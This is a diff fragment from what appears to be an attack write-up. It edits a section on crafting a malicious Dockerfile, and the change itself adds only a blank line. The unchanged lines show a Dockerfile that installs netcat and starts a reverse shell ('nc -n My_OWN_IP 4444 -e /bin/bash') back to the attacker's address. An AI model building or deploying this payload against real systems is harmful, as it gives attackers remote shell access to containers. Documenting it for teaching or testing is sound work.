@@ -74,6 +74,7 @@ We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the i
 
 ```docker
 FROM ubuntu:16.04
+
 RUN apt-get update -y && apt-get install netcat -y
 CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]
 ```
